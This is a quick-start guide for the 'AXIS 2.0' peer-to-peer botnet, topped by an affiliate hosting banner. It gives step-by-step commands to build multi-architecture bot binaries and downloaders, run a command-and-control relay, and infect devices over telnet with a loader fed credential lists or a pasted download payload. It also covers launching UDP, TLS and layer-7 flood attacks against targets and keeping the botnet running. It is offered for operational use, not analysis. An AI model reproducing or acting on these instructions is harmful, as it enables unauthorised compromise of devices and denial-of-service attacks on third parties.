<a target="_blank" href="https://privatealps.net/en?affiliate=Y93PGNR01V" title="Join PrivateAlps">
    <img src="https://privatealps.net/img/privatealps_banner.gif" alt="PrivateAlps">
</a>
# AXIS 2.0 - Quick Start Guide

## 1. Build Everything

```bash
chmod +x build.sh build_relay.sh
./build.sh
./build_relay.sh
```

**Output:**
- `bins/axis.*` - Bot binaries (13 architectures)
- `bins/dlr.*` - Downloaders
- `cnc_server` - C&C server (optional)
- `relay_server` - User control panel
- `loader` - Telnet loader

## 2. Setup Seed Peers

On 3+ VPS servers:

```bash
# Copy binaries
scp bins/axis.* user@vps:/path/to/bot/

# On each VPS
cd /path/to/bot
cp axis.* /tmp/
./axis.arm7 &  # Or your primary arch
```

**Verify:**
```bash
netstat -anu | grep 4915
# Should show UDP listening on 49152 and 49153
```

## 3. Configure Relay

Edit `relay/config.go`:

```go
var seedPeers = []string{
    "vps1-ip:49152",
    "vps2-ip:49152",
    "vps3-ip:49152",
}
var validUsers = map[string]string{
    "admin": "YOUR_STRONG_PASSWORD",
}
```

## 4. Start Relay

```bash
./relay_server
```

**Verify:**
```bash
netstat -tlnp | grep 6969
# Should show TCP listening on 6969
```

## 5. Connect & Test

```bash
telnet relay-ip 6969
# Login with admin:YOUR_PASSWORD

axis-p2p> help
axis-p2p> status
axis-p2p> peers
```

## 6. Initial Infection

**Option A - Use Loader:**
```bash
./loader < botlist.txt
# Format: IP:PORT user:pass arch
```

**Option B - Manual:**
```bash
telnet target-ip 23
# Login with credentials
# Paste P2P download payload (from README.md)
```

## 7. Launch Attack

```bash
telnet relay-ip 6969
axis-p2p> axis-l7 target.com 300
axis-p2p> udp target-ip 120
```

## 8. Monitor

**Bot Activity:**
```bash
tcpdump -i any -n udp port 49152  # Commands
tcpdump -i any -n udp port 49153  # Files
```

**Scanning:**
```bash
tcpdump -i any -n port 23 or port 22
```

**Attacks:**
```bash
tcpdump -i any -n udp or tcp
```

## Default Credentials

**Relay Server:**
- Username: `admin`
- Password: `admin123` (CHANGE THIS!)

## Common Commands

```
axis-p2p> help              # Show help
axis-p2p> status            # Bot count
axis-p2p> peers             # Seed peers
axis-p2p> axis-l7 <target> <time>  # L7 attack
axis-p2p> tlsplus <target> <time>  # TLS flood
axis-p2p> udp <target> <time>      # UDP flood
axis-p2p> quit              # Disconnect
```

## Troubleshooting

**No bots connecting:**
1. Check seeds are running: `ps aux | grep axis`
2. Verify ports open: `netstat -anu | grep 4915`
3. Check firewall: `iptables -L -n`
4. Test P2P: `nc -uvz seed-ip 49152`

**Scanners not working:**
1. Ensure `SELFREP` defined in `bot/config.h`
2. Rebuild bots: `./build.sh`
3. Check binary has scanners: `strings axis.arm | grep -i scanner`

**Attacks not executing:**
1. Check bot count: `axis-p2p> status`
2. Verify command format
3. Monitor P2P traffic: `tcpdump -i any -n udp port 49152`

## Next Steps

1. **Change passwords** in relay/config.go
2. **Add more seed peers** for redundancy
3. **Configure firewall** rules
4. **Set up logging** in logs/ directory
5. **Read full README.md** for advanced features

---

**For complete documentation, see README.md**
